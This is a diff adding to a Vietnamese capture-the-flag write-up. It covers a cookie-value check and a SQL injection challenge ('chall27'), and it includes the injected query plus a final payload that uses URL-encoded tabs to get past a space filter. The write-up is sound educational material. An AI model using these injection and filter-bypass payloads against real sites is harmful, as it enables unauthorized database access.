@@ -25,7 +25,7 @@
 ```
 Ta thấy có Hàm ```$_COOKIE```. Hàm này sẽ trả về giá trị Cookie của biến truyền vào, cụ thể là ```user_lv```.
 Xem xét một hồi thì Hàm này sẽ kiểm tra giá trị của ```user_lv``` có thuộc khoảng ```3 < user_lv <= 4``` hay không.
-Nếu đúng thì sẽ cho chạy hàm solve(1).
+Nếu đúng thì sẽ cho chạy hàm ```solve(1)``` .
 Nhiệm Vụ của chúng ta đơn giản là gửi một giá trị ```user_lv``` mới đúng với điều kiện của đoạn code:
 
 ![image](https://user-images.githubusercontent.com/89735990/179356642-3a290016-1dc1-44a2-a86e-12dde9782b32.png)\
@@ -255,6 +255,25 @@ Sau khi tra thì mình biết được rằng ```124``` là ký tự ``|``, Nào
 - Dưới đây là payload ban đầu của mình : 
 
     ```0) or no = 2 --```
+- Lúc này câu lệnh sql của server sẽ có dạng như sau: 
+```sql
+select id from chall27 where id='guest' and no = (0) or no = 2 -- )
+```
+
+![image](https://user-images.githubusercontent.com/89735990/209596274-f81fac6b-8eca-47b1-8b7c-af471633269e.png)
+
+- Có lẽ trang web này đã chặn cách bypass bằng ``%20`` nên mình sẽ thử với ``%09``
+- Đây là payload sau cùng của mình:
+```sql
+  4)%09or%09no%09like%092--%09
+```
+
+![image](https://user-images.githubusercontent.com/89735990/209596460-cabccbba-132d-4445-934b-27478dcc1831.png)
+
+
+
+
+
 
 
 
